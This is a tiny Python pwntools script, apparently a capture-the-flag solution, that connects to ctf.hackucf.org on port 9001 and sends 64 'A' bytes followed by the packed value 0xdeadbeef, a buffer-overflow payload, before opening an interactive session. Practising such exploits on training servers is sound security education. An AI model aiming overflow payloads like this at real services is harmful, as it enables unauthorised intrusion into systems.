from pwn import *

host='ctf.hackucf.org'
port=9001

c = remote(host=host, port=port)

c.sendline(b'A' * 64 + p32(0xdeadbeef))

c.interactive()